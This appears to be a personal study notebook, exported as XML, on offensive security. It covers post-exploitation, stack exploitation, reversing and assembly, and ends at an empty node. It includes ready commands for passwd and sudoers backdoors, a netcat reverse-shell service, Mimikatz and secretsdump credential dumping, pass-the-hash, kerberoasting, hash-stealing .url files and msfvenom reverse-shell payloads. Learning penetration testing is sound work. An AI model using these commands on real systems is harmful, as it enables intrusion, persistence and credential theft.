  <node name="Post Exploit" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1653087456" ts_lastsave="1653441236">
    <rich_text>search shell_to_meterpreter on multi/handler listener to switch to meterpreter</rich_text>
    <node name="Linux" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652982607" ts_lastsave="1654901294">
      <rich_text scale="h2">Adding and manipulating users</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Manipulating Services</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Cracking Hashes</rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Creating Backdoors</rich_text>
      <codebox char_offset="30" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#adding users directly to /etc/passwd
hacker:$6$salt$uoy3eLWQ8ZK7dv2FoRxQrkOYfc4FT4qDjc1PCObX5vKn4MZgpfwn8Fm0Ve5u63zmaabiFiQWOZeF2qZDQk18Q0:0:0:Hacker:/root:/bin/bash
##To generate password use one of below
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'

#adding user
user add -G additional-groups -s shellname username
#change password
passwd username

#add groups
groupadd groupname
#add user to group
gpasswd -a username groupname
usermod -aG additional-groups username

#add user to sudo file if sudo is writeable
echo "username   ALL=(ALL:ALL) ALL" &gt;&gt; /etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" &gt;&gt;/etc/sudoers</codebox>
      <codebox char_offset="55" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">systemctl status unit
systemctl #lists running units
systemctl start unit #start a unit
systemctl stop unit
systemctl enable unit #start unit at boot
systemctl status PID #show unit associated with given pid
systemctl edit unit #create drop in files for unit</codebox>
    </node>
    <node name="Windows" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652982830" ts_lastsave="1653150532">
      <rich_text scale="h2">Adding Users</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h2">Manipulating Services</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>


</rich_text>
      <rich_text scale="h2">Cracking and Dumping Hashes</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Creating Backdoors</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Active Directory</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">PassThePass/PassTheHash</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Kerberoasting</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Token Impersonation</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">URL File Attack</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <codebox char_offset="13" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">net user exampleuser password123 /add /domain</codebox>
      <codebox char_offset="37" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">#Creating a reverse shell service
sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
[SC] CreateService SUCCESS
sc start evilsvc
#Scheduling tasks
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"</codebox>
      <codebox char_offset="69" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer &lt;compute.name&gt;

#metasploit
hashdump</codebox>
      <codebox char_offset="91" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">#Sticky keys backdoor
##replace sethc.exe with cmd.exe and rename to sethc.exe</codebox>
      <codebox char_offset="111" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">. .\PowerView.ps1
Get-DomainGroup -MemberIdentity &lt;User/Group&gt; #list users groups
Get-DomainGroupMember -Identity "Domain Admins" -Recurse #list members of groups
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname #list enabled users
#
Get-UserProperty -Properties exampleproperty
Get-NetDomain
Get-NetDomainController
Get-NetUsers
Get-NetComputers
Invoke-ShareFinder</codebox>
      <codebox char_offset="138" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">#dumping passwords
secretsdump marvel/example:Password1@&lt;ip&gt;
#pass
crackmapexec &lt;ip/CIDR&gt; -u "&lt;user&gt;" -d &lt;domain&gt; -p &lt;pass&gt;
#hash
crackmapexec &lt;ip/CIDR&gt; -u &lt;user&gt; -H &lt;hash&gt; --local</codebox>
      <codebox char_offset="155" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">GetUserSPNs &lt;DOMAIN/username:password&gt; -dc-ip &lt;ip of DC&gt; -request
hashcat -m 13100 kerb.txt wordlist.txt</codebox>
      <codebox char_offset="178" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">incognito
&gt;list_tokens -u
&gt;impersonate_token domain//user</codebox>
      <codebox char_offset="197" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\&lt;attackIP&gt;\%USERNAME%.icon
IconIndex=1
#save into @likelyclicked.url
responder -l tun0 -rdw</codebox>
    </node>
  </node>
  <node name="System Security" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652129831" ts_lastsave="1653842121">
    <node name="Kernel" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1653407744" ts_lastsave="1653426364">
      <rich_text>• Stack Overflow
• Write-What-Where
• Null Pointer Dereference
• Uninitialised Stack Variable
• Integer Overflow
• UAF
• Pool Overflow
• </rich_text>
      <node name="Stack" unique_id="30" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652131308" ts_lastsave="1655760130">
        <rich_text scale="h2">Theory:</rich_text>
        <rich_text>
• Stack
   ◇ a region of memory that stores temporary variables created by functions in code.
• When a new function is called, a memory address in the </rich_text>
        <rich_text weight="heavy">calling</rich_text>
        <rich_text> function is pushed to the stack - this way, the program knows where to return to once the called function finishes execution. 
• When a function calls another function
   ◇ it pushes a </rich_text>
        <rich_text weight="heavy">return pointer</rich_text>
        <rich_text> to the stack so the called function knows where to return
   ◇ when the called function finishes execution, it pops it off the stack again
• Because this value is saved on the stack, just like our local variables, if we write </rich_text>
        <rich_text style="italic">more</rich_text>
        <rich_text> characters than the program expects, we can overwrite the value and redirect code execution to wherever we wish. Functions such as fgets() can prevent such easy overflow, but you should check how much is actually being read.

</rich_text>
        <rich_text scale="h2">Practical:</rich_text>
        <rich_text>
</rich_text>
        <rich_text scale="h3">1. Basic enumeration</rich_text>
        <rich_text>
   ◇ Initialize mona folder
      ▪ !mona config -set workingfolder c:\mona\%p
   ◇ r2 -d -A ./vuln
      ▪ afl
      ▪ s main
         - or ther interesing func usually sym.vuln
      ▪ ia
         - check protections
      ▪ izz
         - check for interesting strings
      ▪ db
         - set breakpoint at interesting points/possible vuln
      ▪ dc
         - run the program, once with generic input and again with a cyclical string
      ▪ dr
         - display registers
   ◇ Fuzzing
      ▪ Wireshark
         - Find packet in the up direction using the string search, look for the last indication that the server was active
      ▪ spikeFuzz.sh
         - will run fuzz strings across tcp connection, look fro last indication server was active then search in wireshark

</rich_text>
        <rich_text scale="h3">2. Hosting a binary locally</rich_text>
        <rich_text>
   ◇ socat tcp-l:5000,reuseaddr,fork EXEC:"./vuln",pty,stderr
      ▪ All input is literal
         - use \x16 to escape

</rich_text>
        <rich_text scale="h3">3. Find the offset</rich_text>
        <rich_text>
   ◇ /opt/metasploit/tools/exploit/pattern_create.rb -l </rich_text>
        <rich_text style="italic">length</rich_text>
        <rich_text> | xclip -selection clipboard
      ▪ de bruijin same as below but mona finds it more reliably, get rid of \n at end
   ◇ ragg2 -P </rich_text>
        <rich_text style="italic">length</rich_text>
        <rich_text> -r | xclip -selection clipboard
      ▪ Will generate a De Bruijn sequence, paste in payload var
   ◇ wop0 `dr eip`
      ▪ This will work out the offset, the backticks will make dr eip run first
   ◇ !mona findmsp -distance </rich_text>
        <rich_text style="italic">length</rich_text>
        <rich_text>
      ▪ When working with Immunity on windows
   ◇ set offset in exploit script

</rich_text>
        <rich_text scale="h3">4. Overwriting the EIP</rich_text>
        <rich_text>
• Set the rtn to “BBBB” in exploit.py
• run exploit.py
   ◇ the EIP should now be four “B's” or = 42424242

</rich_text>
        <rich_text scale="h3">5. Finding Bad Chars</rich_text>
        <rich_text>
• !mona bytearray -cpb "\x00"
   ◇ C:\mona\oscp\bytearray.bin
• run a script to generate bad characters
• set the payload variable to the string of bad chars the script generates
• run exploit.py
• take note of the esp addr (a)
• !mona compare -f C:\mona\oscp\bytearray.bin -a (a)
   ◇ This should provide a detailed comparison of the bad chars in the bytearray and in the esp address
• update exploit.py to remove badchars

</rich_text>
        <rich_text scale="h3">6. Finding the right modules</rich_text>
        <rich_text>
• !mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00\x01\x07\x08\x2e\x2f\xa0\xa1"
   ◇ !mona jmp -r esp -cpb “\x00"
   ◇ Choose an address and update your exploit.py by changing the retn addr and write it backwards (little endian)
      ▪ Example
         -  \x01\x02\x03\x04 would be \x04\x03\x02\x01 in little endian

7</rich_text>
        <rich_text scale="h3">. Generating Shellcode</rich_text>
        <rich_text>
   ◇ msfvenom
      ▪ Windows
         -  msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.156 lport=4444 -f hex -e x86/shikata_ga_nai -b "\x00\x0a"
      ▪ Linux
         - msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4444 -b "\x00\x0a" -f hex -v shellcode
   ◇ pwntools
      ▪ context.binary = ELF('./vuln')
      ▪ p = process()
      ▪ payload = asm(shellcraft.sh())
      ▪ payload = payload.ljust(312, b'A')
      ▪ payload += p32(0xffffcfb4)
      ▪ log.info(p.clean())
      ▪ p.sendline(payload)

</rich_text>
        <rich_text scale="h2">Terminology:</rich_text>
        <rich_text>
• </rich_text>
        <rich_text weight="heavy">De Bruijn Sequences</rich_text>
        <rich_text>
   ◇ a sequence where no string of n characters is repeated.
   ◇ makes finding the offset until EIP much simpler
• </rich_text>
        <rich_text weight="heavy">Shellcode</rich_text>
        <rich_text>
   ◇ Shellcode is essentially </rich_text>
        <rich_text weight="heavy">assembly instructions</rich_text>
        <rich_text>, except we input them into the binary; once we input it, we overwrite the return pointer to hijack code execution and point at our own instructions!
• </rich_text>
        <rich_text weight="heavy">NOP</rich_text>
        <rich_text>
   ◇ NOP (no operation) instructions do exactly what they sound like: </rich_text>
        <rich_text style="italic">nothing</rich_text>
        <rich_text>.
• </rich_text>
        <rich_text weight="heavy">SEH</rich_text>
        <rich_text>
   ◇ Structured Exception Handler
      ▪ Triggered exception causes OS to evaluate and determine if it should handle or continue
      ▪ If SEH is overwritten registers will be zeroed out
         - The flaw is that we can overwrite SEH with POP POP RETN and then we can overwrite nSEH with jmp opcode to controlled memory
            → </rich_text>
        <rich_text weight="heavy">buffer = "A"*608 + [nSEH] + [SEH] + "D"*1384</rich_text>
        <rich_text>
            → </rich_text>
        <rich_text weight="heavy">buffer = "A"*608 + "\xEB\x06\x90\x90" + "\x19\x76\x61\x61" + NOP + shellcode + "B"*(1384-len(NOP+shellcode))</rich_text>
        <rich_text>
• Egghunters
   ◇ Not enough buffer space?
      ▪ Buffer space before writing EIP is somewhere in memory
      ▪ Buffer segment may be stored somewhere different
   ◇ Egghunter search entire memory range for final shellcode and redirect to it
      ▪ </rich_text>
        <rich_text link="webs http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf</rich_text>
        <rich_text>
   ◇ </rich_text>
        <rich_text weight="heavy">!mona egg -t b33f</rich_text>
        <rich_text>
      ▪ 32 bytes
• </rich_text>
        <rich_text weight="heavy">NX</rich_text>
        <rich_text>/</rich_text>
        <rich_text weight="heavy">DEP</rich_text>
        <rich_text>
   ◇ No eXecute
   ◇ Data Execution Prevention
   ◇ defines areas of memory as either </rich_text>
        <rich_text weight="heavy">instructions</rich_text>
        <rich_text> or </rich_text>
        <rich_text weight="heavy">data</rich_text>
        <rich_text>.
   ◇ input will be stored as </rich_text>
        <rich_text weight="heavy">data</rich_text>
        <rich_text>
   ◇ To get around NX, exploit developers have to leverage a technique called </rich_text>
        <rich_text weight="heavy">ROP</rich_text>
        <rich_text>
• </rich_text>
        <rich_text weight="heavy">ROP</rich_text>
        <rich_text>
   ◇ Return-Oriented Programming
   ◇ Chaining together small chunks of code already present within the binary itself in such a way to do what you wish. 
   ◇ </rich_text>
        <rich_text link="webs https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/">https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/</rich_text>
        <rich_text>
   ◇ buffer = "http://." + "A"*17416 + "\x60\x9C\x01\x10" + rop + NOP + shell + "C"*(7572-len(rop + NOP + shell))
• </rich_text>
        <rich_text weight="heavy">Gadgets</rich_text>
        <rich_text>
   ◇ Gadgets are small snippets of code followed by a ret instruction
   ◇ We can manipulate the ret of these gadgets in such a way as to string together a large chain of them to do what we want.
   ◇ if the gadget pops values from the stack, simply place those values afterwards (including the pop rip in ret)
   ◇ We can use the tool ROPgadget to find possible gadgets.
•</rich_text>
        <rich_text weight="heavy"> Format String Bug</rich_text>
        <rich_text>
• </rich_text>
        <rich_text weight="heavy">Stack Canaries</rich_text>
        <rich_text>
   ◇At the beginning of the function, a random value is placed on the stack. Before the program executes ret, the current value of that variable is compared to the initial: if they are the same, no buffer overflow has occurred.
   ◇ Bypassing
      ▪ Leak it using another vuln
      ▪ brute-force
      ▪ jump the canary
         - The simplest option is using format string if it is present - the canary, like other local variables, is on the stack, so if we can leak values off the stack it's easy.
      ▪ Brute-Force it
• </rich_text>
        <rich_text weight="heavy">PIE</rich_text>
        <rich_text>
   ◇ PIE stands for Position Independent Executable, which means that every time you run the file it gets loaded into a different memory address.
      ▪ All we need to do is find a single address and PIE is bypassed.
         - We know that the </rich_text>
        <rich_text weight="heavy">return pointer</rich_text>
        <rich_text> is located on the stack - and much like a canary, we can use format string (or other ways) to read the value off the stack.
         - The value will always be a static offset away from the binary base
• </rich_text>
        <rich_text weight="heavy">ASLR</rich_text>
        <rich_text>
   ◇ Address Space Layout Randomisation
   ◇ Randomise memory address', libraries and stacks
   ◇ Os loads same exe at different locations in memory
   ◇ Bypass
      ▪ Abusing non-aslr supporting binaries
         - you can use mona to search for binaries without aslr enabled
      ▪ Partial EIP overrite
         - ASLR randomises the most significant two bytes
         - Pages are always aligned to a 0x1000 alignment.
            → eg.)  0x00007f8dce27f000 0x56531c9c5000 0xffffffffff600000 0x400000
      ▪ Leak
      ▪ Brute-Force
•</rich_text>
        <rich_text weight="heavy"> GOT Overwrite</rich_text>
        <rich_text>
   ◇ GOT stores the actual locations in libc of functions.
   ◇ Overwriting entry can lead to code execution
• </rich_text>
        <rich_text weight="heavy">RELRO</rich_text>
        <rich_text>
   ◇ RELRO is a protection to stop any GOT overwrites from taking place
   ◇ </rich_text>
        <rich_text weight="heavy">Partial RELRO</rich_text>
        <rich_text>
      ▪ moves the GOT above the program's variables, meaning you can't overflow </rich_text>
        <rich_text weight="heavy">into</rich_text>
        <rich_text> the GOT
      ▪ does not prevent format string overwrites
   ◇</rich_text>
        <rich_text weight="heavy"> Full RELRO</rich_text>
        <rich_text>
      ▪ makes the GOT completely read-only
      ▪ This is </rich_text>
        <rich_text weight="heavy">not</rich_text>
        <rich_text> the default in binaries due to the fact that it can make it take </rich_text>
        <rich_text weight="heavy">much</rich_text>
        <rich_text> longer to load as it need to resolve all the function addresses at once.
• </rich_text>
        <rich_text weight="heavy">Syscalls</rich_text>
        <rich_text>
   ◇ A </rich_text>
        <rich_text weight="heavy">syscall</rich_text>
        <rich_text> is a </rich_text>
        <rich_text weight="heavy">sys</rich_text>
        <rich_text>tem </rich_text>
        <rich_text weight="heavy">call</rich_text>
        <rich_text>, and is how the program enters the kernel in order to carry out specific tasks such as creating processes, I/O and any others they would require kernel-level access.
   ◇ </rich_text>
        <rich_text link="webs https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</rich_text>
      </node>
      <node name="Heap" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652131329" ts_lastsave="1653411987">
        <rich_text scale="h2">Theory:
</rich_text>
        <rich_text>• Heap
   ◇  an area of memory that can be dynamically allocated. This means that when you need new space, you can "request" more from the heap.</rich_text>
        <rich_text scale="h2">

Practical:
</rich_text>
        <rich_text>• Heap Overflow
   ◇ </rich_text>
        <rich_text scale="h2">

Terminology:</rich_text>
        <rich_text>
• </rich_text>
        <rich_text weight="heavy">Chunks</rich_text>
        <rich_text>
   ◇ Allocated chunks
      ▪ metadata
      ▪ user data
   ◇ Free Chunks
      ▪ sorted into bins
• </rich_text>
        <rich_text weight="heavy">Bins</rich_text>
        <rich_text>
   ◇ List of free chunks
   ◇ doubly or singularly linked
   ◇ Fast Bins
      ▪ 10 fast bins that contain chunks of the same size
      ▪ addition and deletion occur in LIFO manner
   ◇ Unsorted Bins
      ▪ One of these
      ▪ small and large freed chunks
   ◇ Small Bins
      ▪ 62
      ▪ doubly linked
      ▪ FIFO
      ▪ sizes of chunks can coalesce
   ◇ Large Bins
      ▪ 63
   ◇ Head and Tail</rich_text>
      </node>
    </node>
    <node name="Reversing" unique_id="63" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288368" ts_lastsave="1652288397">
      <rich_text scale="h2">Linux</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3">file</rich_text>
      <rich_text>
• file is usually the first tool I run when reviewing a file
• it helps determine the file type, as well as any protections that exist on the file
• example usage:
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3">strings</rich_text>
      <rich_text>
• strings is the second tool I run
• It will scan the whole file, by default, for “printable character sequences...followed by an unprintable character” or strings
• example :
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h3">nm</rich_text>
      <rich_text>
• nm lists symbols
• this will show functions as well and we can identify commonly exploitable functions such as gets(), puts(), etc.
• example:
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

By this point I have some idea of the files contents and will run the file and supply input as an argument and if prompted.

Once I have an idea of the way the file is supposed to run, I will check the system calls and library calls
</rich_text>
      <rich_text scale="h3">strace</rich_text>
      <rich_text>
• strace can give you a deeper insight into how to binary is interacting with the os, as well as display information that might not be found otherwise
• example usage
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h2">
</rich_text>
      <rich_text scale="h3">ltrace</rich_text>
      <rich_text>
• ltrace intercepts dynamic library calls and the signals recieved during execution, it is similar in function to strace but can reveal different information, I tend to use both to get a better idea of the binary
• example
</rich_text>
      <rich_text justification="left"></rich_text>
      <codebox char_offset="175" justification="left" frame_width="100" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">file ./binary</codebox>
      <codebox char_offset="361" justification="left" frame_width="100" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">strings ./binary</codebox>
      <codebox char_offset="512" justification="left" frame_width="100" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">nm -D ./binary</codebox>
      <codebox char_offset="922" justification="left" frame_width="100" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">strace ./binary</codebox>
      <codebox char_offset="1155" justification="left" frame_width="100" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">ltrace -i -C ./binary</codebox>
    </node>
    <node name="Assembly Crash Course" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1653842121" ts_lastsave="1654474792">
      <rich_text>• Registers
   ◇ 16 general Purpose
      ▪ RAX
         - Stores function return values
      ▪ RCX
         - Counter for string and loop
      ▪ RDX
         - I/O
      ▪ RBX
         - Base pointer
      ▪ RSP
         - Stack Pointer
      ▪ RBP
         - Base pointer
      ▪ RSI
         - source index for strings
      ▪ RDI
         - Destination index
      ▪ RIP
         - Instruction pointer
      ▪ R8-R15
• Assembly Instructions
   ◇ MOV
      ▪ register to register
      ▪ mem to reg or reg to mem
      ▪ immediate to register or mem
      ▪ never mem to mem
      ▪ Zero extension when writing to registers on a 32bit operand
   ◇ PUSH
      ▪ add a value to stack
      ▪ changes rax by 8
   ◇ CALL
      ▪ push addr of next inst to stack, decreases srsp by 8
      ▪ changes rip to addr in instruction
   ◇ TEST
   ◇ NOP
      ▪ 0x90 
      ▪ XCHG (E)AX, (E)AX
   ◇ LEA
   ◇ POP
      ▪ remove value from stack
      ▪ changes rax by 8
   ◇ CMP
   ◇ JZ
   ◇ JNZ
   ◇ XOR
   ◇ JMP
   ◇ ADD/SUB
      ▪ add and subtract
   ◇ RET
      ▪ pop top stack into rip and it could also add bytes to rsp
         - ret
         - ret 0x08
   ◇ INC
   ◇ DEC</rich_text>
      <node name="Stack Overview" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1653844045" ts_lastsave="1653844273">
        <rich_text>• LIFO
   ◇ last-in-first-out
   ◇ Data is pushed on top and popped off top
   ◇ stack of plates
   ◇ grows down
• RSP
   ◇ points to top of stack
• Return addresses
   ◇ function can return to what called it
• Local vars
• arguments
• save space for registers
• dynamically allocated memorey
   ◇ alloca</rich_text>
      </node>
      <node name="Shellcoding" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1654474792" ts_lastsave="1654479975">
        <rich_text scale="h2">Automated</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="10" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#msfvenom
msfvenom --list payloads
msfvenom -p windows/messagebox --payload-options</codebox>
      </node>
    </node>
  </node>
  <node name="Programming" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652129843" ts_lastsave="1652718071">
    <node name="Python" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652131373" ts_lastsave="1652718063">
      <rich_text justification="left"></rich_text>
      <codebox char_offset="0" justification="left" frame_width="150" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1"></codebox>
      <node name="pwntools" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652131394" ts_lastsave="1652131394">
        <rich_text scale="h2">Processes</rich_text>
        <rich_text>
• p = process('./vulnerable_binary')
• p = remote('my.special.ip', port)

</rich_text>
        <rich_text scale="h3">Sending data to processes</rich_text>
        <rich_text>
• p.send(data)
• p.sendline(data)

</rich_text>
        <rich_text scale="h3">Recieving data from process</rich_text>
        <rich_text>
• p.recv(numb)
• p.recvuntil(delimiter, drop=False)
• p.recvline(keepends=True)
• p.clean(timeout=0.02)

</rich_text>
        <rich_text scale="h2">Logging</rich_text>
        <rich_text>
• log.info('Binary Base is at 0x400000')
• log.success('ASLR bypassed! Libc base is at 0xf7653000')
• log.error('The payload is too long')

</rich_text>
        <rich_text scale="h2">Context</rich_text>
        <rich_text>
• context.arch = 'i386'
• context.os = 'linux'
• context.endian = 'little'
• context.bits = 64
• context.binary = './vulnerable_binary'
   ◇ p = process() 
      ▪ will automatically run the binary in context

</rich_text>
        <rich_text scale="h2">Packing</rich_text>
        <rich_text>
• p64(0x04030201) == b'\x01\x02\x03\x04'
   ◇  context.endian = 'big'
   ◇ p64(0x04030201) == b'\x04\x03\x02\x01'
• u64
   ◇ does the opposite

</rich_text>
        <rich_text scale="h2">ELF</rich_text>
        <rich_text>
• elf = ELF('./vulnerable_program')
• p = elf.process()
• main_address = elf.functions['vuln']
   ◇ return to vuln function
• libc = elf.libc

</rich_text>
        <rich_text scale="h2">ROP</rich_text>
        <rich_text>
• rop = ROP(elf)
• rop.raw('A' * 64)
• rop.raw(0x12345678)</rich_text>
      </node>
    </node>
    <node name="Golang" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652718071" ts_lastsave="1654285599">
      <rich_text>General Template
</rich_text>
      <rich_text justification="left"></rich_text>
      <codebox char_offset="17" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="go" highlight_brackets="1" show_line_numbers="1">package main

import(
	"fmt"
	"github.com/thirdparty/library"
)

//global variables
var (
	stringvar		= "Example string"
	intvar			= 1337
)

//functions
func split(sum int) (x, y int) {
	x = sum * 4 / 9
	y = sum - x
	return x, y
}

//pointers
func getPointer () (myPointer *int) {
  a := 234
  return &amp;a
}

//Structs
type Vertex struct {
	X int
	Y int
}

func main() {
	//local variable declaration
	variable1 := 3.
	var variable2 float64 = 3.15
	//Init a struct
	v := Vertex{1, 2}
	v.X = 4
	fmt.Println(v.X, v.Y)
	split(28)
	//slices
	slice1:= []int{2, 3, 4}
	for i, val := range slice1 {
		fmt.Printf("Position %d is %d\n", i, val)
	}
	slice2 := []byte("Hello")
	fmt.Println(variable1)
	fmt.Println(variable2)
	fmt.Println(stringvar)
	fmt.Println(intvar * 2)
	fmt.Println("Hello World")
	//format specifier
	fmt.Printf("Leetspeak is %d", intvar)
	b := *getPointer()
	fmt.Println("Value is", b)
	fmt.Println("slice2 says", slice2)
}</codebox>
    </node>
    <node name="Ruby" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652282401" ts_lastsave="1652718123"/>
    <node name="Powershell" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652230679" ts_lastsave="1652230679">
      <node name="Basics" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652230679" ts_lastsave="1652231300">
        <rich_text justification="left"></rich_text>
        <codebox char_offset="0" justification="left" frame_width="150" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">Get-Help #​cmdlet Get Usage information on the specified cmdlet.
Get-Command -Name ​string #Searches for Commands related to given string.
Get-Process #Obtains the running processes on system.
Select-String -Path ​path ​-Pattern ​string #Searches for specified string within the documents in given path.
Get-Content ​file #Displays the contents of specified file
Get-Service ​string #Displays services on the system (search string optional)
Get-Module -ListAvailable #Returns a list of available modules.
Import-Module ​module_path #Imports the specified module.
foreach (​statement) ​{​body} #PowerShell For Loop Syntax</codebox>
      </node>
      <node name="Download and Executes" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652230679" ts_lastsave="1652231415">
        <rich_text justification="left"></rich_text>
